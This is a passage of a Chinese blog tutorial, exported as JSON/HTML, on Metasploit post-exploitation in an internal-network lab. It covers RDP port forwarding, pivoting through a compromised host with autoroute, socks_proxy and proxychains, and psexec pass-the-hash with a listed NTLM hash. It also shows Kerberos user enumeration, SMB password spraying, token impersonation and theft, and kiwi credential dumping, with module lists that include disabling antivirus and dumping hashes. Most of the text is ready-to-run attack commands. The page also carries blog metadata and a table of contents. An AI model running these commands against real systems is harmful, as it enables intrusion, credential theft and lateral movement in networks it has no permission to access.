href=\"#36-端口转发\">#</a> 3.6 端口转发</h2>\n<ul>\n<li>如果目标主机在开启防火墙的情况下，有可能拦截远程终端端口（3389），使用 msf 将 3389 端口转发出来</li>\n<li>模块：portfwd</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> <span class=\"token builtin class-name\">help</span> portfwd\nrdesktop <span class=\"token number\">10.10</span>.10.138 <span class=\"token comment\">#开启防火墙后无法连接</span>\nmeterpreter <span class=\"token operator\">></span> <span class=\"token function\">netstat</span> <span class=\"token comment\">#查看目标端口，发现开启3389并且处于监听状态，但由于防火墙拦截无法连接</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>转发 3389</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> portfwd <span class=\"token function\">add</span> -l <span class=\"token number\">1234</span> -p <span class=\"token number\">3389</span> -r 受害者主机IP <span class=\"token comment\">#将3389端口转发到攻击机本地的1234端口上</span>\nmeterpreter <span class=\"token operator\">></span> portfwd list <span class=\"token comment\">#查看转发的列表</span>\nrdesktop <span class=\"token number\">127.0</span>.0.1:1234 <span class=\"token comment\">#连接本地1234端口即连接受害者3389</span>\nmeterpreter <span class=\"token operator\">></span> portfwd flush <span class=\"token comment\">#清空转发列表</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"37-跨路由访问\"><a class=\"markdownIt-Anchor\" href=\"#37-跨路由访问\">#</a> 3.7 跨路由访问</h2>\n<ul>\n<li>在渗透测试过程中，经常拿到 web 主机与数据库不同在一个网段，可以得出这台主机还连着一个内网， 如果想要继续渗透内网，可以把这台 web 主机当作跳板机，对内网进行渗透</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220917160524427.png\" alt=\"image-20220917160524427\"></p>\n<ul>\n<li>\n<p>kali 无法直接访问目标主机，但是 kali 拿下受害者后发现受害者可以访问目标主机，所以可以通过受害者做跳板访问目标主机</p>\n</li>\n<li>\n<p>使用 msf 生成后门并连接</p>\n</li>\n<li>\n<p>连接后 kali 使用的是桥接模式，windoes server 5 有两块网卡，一块是桥接，另一块是 10.10.10 的仅主机模式的内网网卡，连接到 windows server5 后可 arp_scan 扫描 10 网段的主机，但是在 kali 中直接 ping 是无法访问的</p>\n</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919175444253.png\" alt=\"image-20220919175444253\"></p>\n<ul>\n<li>获取受害者主机网卡</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> run get_local_subnets <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919175717693.png\" alt=\"image-20220919175717693\"></p>\n<ul>\n<li>绑定路由</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> run autoroute -s <span class=\"token number\">10.10</span>.10.0/24 <span class=\"token comment\">#将本机和10网段进行绑定</span>\nmeterpreter <span class=\"token operator\">></span> run autoroute -p <span class=\"token comment\">#查看已绑定的路由表</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> route <span class=\"token function\">add</span> <span class=\"token number\">10.10</span>.10.0 <span class=\"token number\">255.255</span>.255.0 <span class=\"token number\">1</span> <span class=\"token comment\">#最后的1是指session，要先将session放到后台</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> route print <span class=\"token comment\">#查看已绑定的路由表，要先将session放到后台</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919175906054.png\" alt=\"image-20220919175906054\"></p>\n<ul>\n<li>使用 socks_proxy 开启隧道</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> use auxiliary/server/socks_proxy <span class=\"token comment\">#直接使用默认端口和版本即可</span>\nmsf6 auxiliary<span class=\"token punctuation\">(</span>server/socks_proxy<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit <span class=\"token comment\">#默认以jobs的方式后台运行</span>\nmsf6 auxiliary<span class=\"token punctuation\">(</span>server/socks_proxy<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token function\">jobs</span> <span class=\"token comment\">#查看运行的socks</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>编辑本地隧道代理文件</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vi</span> /etc/proxychains4.conf\n<span class=\"token comment\">#将最后一行改为 socks5 本地IP 端口</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919180632507.png\" alt=\"image-20220919180632507\"></p>\n<ul>\n<li>这时就可以通过 proxychains4 工具跨路由访问</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">proxychains4 nmap <span class=\"token number\">10.10</span>.10.144 -sT -A -p <span class=\"token number\">445</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919180955255.png\" alt=\"image-20220919180955255\"></p>\n<ul>\n<li>在 msf 中设置代理</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">setg Proxies socks4/5:ip:port <span class=\"token comment\">#让msf所有模块的流量都通过此代理走。(setg全局设置)</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> setg Proxies socks5:10.189.0.249:1080\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> ReverseAllowProxy <span class=\"token boolean\">true</span> <span class=\"token comment\">#允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>之后可在 msf 中使用模块并访问到目标主机</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919182151677.png\" alt=\"image-20220919182151677\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> payload windows/meterpreter/bind_tcp <span class=\"token comment\">#reverse是反向连接，bind是正向连接</span>\npayload <span class=\"token operator\">=</span><span class=\"token operator\">></span> windows/meterpreter/bind_tcp\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4\nsmbpass <span class=\"token operator\">=</span><span class=\"token operator\">></span> aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919182833003.png\" alt=\"image-20220919182833003\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919182854383.png\" alt=\"image-20220919182854383\"></p>\n<h2 id=\"38-域信息收集\"><a class=\"markdownIt-Anchor\" href=\"#38-域信息收集\">#</a> 3.8 域信息收集</h2>\n<h3 id=\"381-常用信息收集模块\"><a class=\"markdownIt-Anchor\" href=\"#381-常用信息收集模块\">#</a> 3.8.1 常用信息收集模块</h3>\n<ul>\n<li>收集端口信息</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep #基于arp协议发现内网存活主机，这不能通过代理使用\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp #基于tcp进行端口扫描，默认扫描1-10000端口\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep #基于udp协议发现内网存活主机\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe #基于udp协议发现内网存活主机\nauxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname #基于netbios协议发现内网存活主机\nauxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version #发现内网ftp服务，基于默认21端口\nauxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version #发现内网ssh服务，基于默认22端口\nauxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version #发现内网telnet服务，基于默认23端口\nauxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp #发现dns服务，基于默认53端口\nauxiliary&#x2F;scanner&#x2F;http&#x2F;http_version #发现内网http服务，基于默认80端口\nauxiliary&#x2F;scanner&#x2F;http&#x2F;title #探测内网http服务的标题\nauxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version #发现内网smb服务，基于默认的445端口\nuse auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口\nuse auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_hashdump #发现内网oracle服务,基于默认的1521端口\nauxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version #发现内网mysql服务，基于默认3306端口\nauxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner #发现内网RDP服务，基于默认3389端口\nauxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_server #发现内网Redis服务，基于默认6379端口\nauxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version #探测内网的db2服务，基于默认的50000端口\nauxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>收集域信息</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #查看登录过的用户信息\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_ad_groups #查看组信息\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_domain #定位域控\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_ad_computers #域内所有机器\nuse post&#x2F;windows&#x2F;gather&#x2F;enum_patches #发现缺失的补丁\nuse post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester #快速识别可能被利用的漏洞\nrun post&#x2F;windows&#x2F;manage&#x2F;migrate #自动进程迁移\nrun post&#x2F;windows&#x2F;gather&#x2F;checkvm #查看目标主机是否运行在虚拟机上\nrun post&#x2F;windows&#x2F;manage&#x2F;killav #关闭杀毒软件\nrun post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面服务\nrun post&#x2F;windows&#x2F;manage&#x2F;autoroute #查看路由信息\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #列举当前登录的用户\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_applications #列举应用程序\nrun post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名和密码\nrun post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump #dump出所有用户的hash\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_domain_tokens #寻找域token<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"382-tcp端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#382-tcp端口扫描\">#</a> 3.8.2 tcp 端口扫描</h3>\n<ul>\n<li>由于 3.7 已经设置了代理，可直接用跳板扫描 10.10.10 网段</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> use auxiliary/scanner/portscan/tcp\nmsf6 auxiliary<span class=\"token punctuation\">(</span>scanner/portscan/tcp<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> rhosts <span class=\"token number\">10.10</span>.10.1/24\nmsf6 auxiliary<span class=\"token punctuation\">(</span>scanner/portscan/tcp<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> ports <span class=\"token number\">445</span>\nmsf6 auxiliary<span class=\"token punctuation\">(</span>scanner/portscan/tcp<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919184419946.png\" alt=\"image-20220919184419946\"></p>\n<h2 id=\"39-密码喷射\"><a class=\"markdownIt-Anchor\" href=\"#39-密码喷射\">#</a> 3.9 密码喷射</h2>\n<ul>\n<li>探测存在的用户</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 auxiliary<span class=\"token punctuation\">(</span>scanner/portscan/tcp<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> use auxiliary/gather/kerberos_enumusers\nmsf6 auxiliary<span class=\"token punctuation\">(</span>gather/kerberos_enumusers<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> domain redteam.club\ndomain <span class=\"token operator\">=</span><span class=\"token operator\">></span> redteam.club\nmsf6 auxiliary<span class=\"token punctuation\">(</span>gather/kerberos_enumusers<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> rhosts <span class=\"token number\">10.10</span>.10.136 <span class=\"token comment\">#设置域控IP</span>\nrhosts <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">10.10</span>.10.136\nmsf6 auxiliary<span class=\"token punctuation\">(</span>gather/kerberos_enumusers<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> user_file ~/Desktop/user <span class=\"token comment\">#设置用户名字典</span>\nuser_file <span class=\"token operator\">=</span><span class=\"token operator\">></span> ~/Desktop/user<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919214858920.png\" alt=\"image-20220919214858920\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919214926688.png\" alt=\"image-20220919214926688\"></p>\n<ul>\n<li>对多个 IP 指定用户猜解密码</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">use auxiliary/scanner/smb/smb_login\n<span class=\"token builtin class-name\">set</span> user_file <span class=\"token comment\">#用户名文件</span>\n<span class=\"token builtin class-name\">set</span> sbmpass <span class=\"token comment\">#明文密码</span>\n<span class=\"token builtin class-name\">set</span> rhosts <span class=\"token comment\">#攻击IP，可以是一个网段</span>\n<span class=\"token builtin class-name\">set</span> smbdomain <span class=\"token comment\">#域</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919215241974.png\" alt=\"image-20220919215241974\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919215211554.png\" alt=\"image-20220919215211554\"></p>\n<h2 id=\"310-令牌登录\"><a class=\"markdownIt-Anchor\" href=\"#310-令牌登录\">#</a> 3.10 令牌登录</h2>\n<ul>\n<li><mark>需要本地管理员权限才能看到凭证和 ps 信息，才能进行窃取和注入进程</mark></li>\n<li>如果开启了代理无法启动监听，执行：</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">set</span> ReverseAllowProxy <span class=\"token boolean\">true</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> load incognito <span class=\"token comment\">#加载incognito模块</span>\nmeterpreter <span class=\"token operator\">></span> list_tokens -u <span class=\"token comment\">#列出当前系统可用的token</span>\nmeterpreter <span class=\"token operator\">></span> impersonate_token <span class=\"token string\">'NT AUTHORITY\\SYSTEM'</span> <span class=\"token comment\">#假冒SYSTEM token</span>\nmeterpreter <span class=\"token operator\">></span> impersonate_token NT AUTHORITY<span class=\"token punctuation\">\\</span>SYSTEM <span class=\"token comment\">#参数不加单引号需要对特殊字符进行转义</span>\nmeterpreter <span class=\"token operator\">></span> rev2self <span class=\"token comment\">#返回原始token</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919221416882.png\" alt=\"image-20220919221416882\"></p>\n<h2 id=\"311-steal_token窃取令牌\"><a class=\"markdownIt-Anchor\" href=\"#311-steal_token窃取令牌\">#</a> 3.11 steal_token 窃取令牌</h2>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> <span class=\"token function\">ps</span> <span class=\"token comment\">#查看系统进程信息</span>\nmeterpreter <span class=\"token operator\">></span> steal_token <span class=\"token operator\">&lt;</span>pid值<span class=\"token operator\">></span> <span class=\"token comment\">#从指定进程中窃取token</span>\nmeterpreter <span class=\"token operator\">></span> drop_token <span class=\"token comment\">#删除窃取的token</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919221455764.png\" alt=\"image-20220919221455764\"></p>\n<h2 id=\"312-msf使用kiwi导出票据\"><a class=\"markdownIt-Anchor\" href=\"#312-msf使用kiwi导出票据\">#</a> 3.12 msf 使用 kiwi 导出票据</h2>\n<ul>\n<li>导出票据需要<mark> system 权限</mark></li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> load kiwi <span class=\"token comment\">#加载kiwi模块</span>\nmeterpreter <span class=\"token operator\">></span> creds_msv <span class=\"token comment\">#列出可用的ntlm</span>\nmeterpreter <span class=\"token operator\">></span> dcsycn_ntlm redteam<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>administrator <span class=\"token comment\">#通过NTLM进行切换身份</span>\nmeterpreter <span class=\"token operator\">></span> dcsycn readteam<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>administrator<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"313-ms-14-086\"><a class=\"markdownIt-Anchor\" href=\"#313-ms-14-086\">#</a> 3.13 MS 14-086</h2>\n<ul>\n<li>域控为 windows server <mark>2008</mark> 时使用</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919222259959.png\" alt=\"image-20220919222259959\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#参数说明</span>\n-domain：域名\n-password：普通域用户密码\n-rhosts：域控主机名.域名\n-rport：域控端口（默认）\n-user：普通域用户\n-user_sid：域普通用户SID<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n","feature":true,"text":"#常用命令 sessions -K 结束全部会话 # 1、数据库后端 关于数据库操作： db_connect db_disconnect db_export db_import db_nmap db_rebuild_cache db_remove db_save db_statu...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"web安全","slug":"web安全","count":4,"path":"api/categories/web安全.json"}],"tags":[{"name":"web安全","slug":"web安全","count":4,"path":"api/tags/web安全.json"},{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8E%E7%AB%AF\"><span class=\"toc-text\"> 1、数据库后端</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-%E9%85%8D%E5%90%88db_autopwn%E5%AF%B9%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 1.2 配合 db_autopwn 对主机实现自动攻击</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-msf%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8\"><span class=\"toc-text\"> 2、msf 生成后门</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#21-msfvenom\"><span class=\"toc-text\"> 2.1 msfvenom</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#22-%E7%94%9F%E6%88%90%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6\"><span class=\"toc-text\"> 2.2 生成可执行文件</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#23-%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC\"><span class=\"toc-text\"> 2.3 开启监听</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#24-%E6%89%A9%E5%B1%95%E7%9B%91%E5%90%AC%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\"> 2.4 扩展监听命令</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#25-%E4%BC%9A%E8%AF%9D%E6%93%8D%E4%BD%9C\"><span class=\"toc-text\"> 2.5 会话操作</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#3-meterpreter%E5%90%8E%E6%B8%97%E9%80%8F\"><span class=\"toc-text\"> 3、Meterpreter 后渗透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#31-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\"> 3.1 常用命令</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#32-kiwi%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\"> 3.2 kiwi 使用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#33-windows-shell%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3\"><span class=\"toc-text\"> 3.3 windows shell 乱码解决</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#34-psexec%E7%99%BB%E5%BD%95%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA\"><span class=\"toc-text\"> 3.4 psexec 登录内网主机</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#35-%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF\"><span class=\"toc-text\"> 3.5 开启远程终端</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#36-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\"> 3.6 端口转发</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#37-%E8%B7%A8%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\"> 3.7 跨路由访问</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#38-%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\"> 3.8 域信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#381-%E5%B8%B8%E7%94%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A8%A1%E5%9D%97\"><span class=\"toc-text\"> 3.8.1 常用信息收集模块</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#382-tcp%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\"> 3.8.2 tcp 端口扫描</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#39-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84\"><span class=\"toc-text\"> 3.9 密码喷射</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#310-%E4%BB%A4%E7%89%8C%E7%99%BB%E5%BD%95\"><span class=\"toc-text\"> 3.10 令牌登录</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#311-steal_token%E7%AA%83%E5%8F%96%E4%BB%A4%E7%89%8C\"><span class=\"toc-text\"> 3.11 steal_token 窃取令牌</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#312-msf%E4%BD%BF%E7%94%A8kiwi%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE\"><span class=\"toc-text\"> 3.12 msf 使用 kiwi 导出票据</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#313-ms-14-086\"><span class=\"toc-text\"> 3.13 MS 14-086</span></a></li></ol></li></ol>","author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"CobaltStrike","uid":"2c775c9f2810157671c3686070ee9f85","slug":"CobaltStrike","date":"2022-10-06T14:02:27.000Z","updated":"2022-10-06T14:03:06.563Z","comments":true,"path":"api/articles/CobaltStrike.json","keywords":null,"cover":"https://picb.zhimg.com/v2-03cbff5f588c507b48be6485313f8b3b_r.jpg?source=1940ef5c","text":"# 1、Cobalt Strike 介绍 # 1.1 介绍 Cobalt Strike 是一款基于 java 的渗透测试神器，常被业界人称为 CS 神器。自 3.0 以后已经不在使用 Metasploit 框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"web安全","slug":"web安全","count":4,"path":"api/categories/web安全.json"}],"tags":[{"name":"web安全","slug":"web安全","count":4,"path":"api/tags/web安全.json"},{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"域渗透小结","uid":"b763bab809532eb18f1e59a115b4ee11","slug":"域渗透小结","date":"2022-10-06T13:57:10.000Z","updated":"2022-10-06T13:59:54.623Z","comments":true,"path":"api/articles/域渗透小结.json","keywords":null,"cover":"https://th.bing.com/th/id/OIP.iYZ8PNZDC-twk7RgQikRYwHaKf?pid=ImgDet&rs=1","text":"# 域渗透 常用命令总结 klist #查看当前存储的票证 net view &#x2F;domain:domainame #查询域内主机 # 1、域基本信息、域控收集 使用 systeminfo 命令，当主机在域中时，会显示所在的域 systeminfo 使用 net time...","link":"","photos":[],"count_time":{"symbolsCount":"38k","symbolsTime":"34 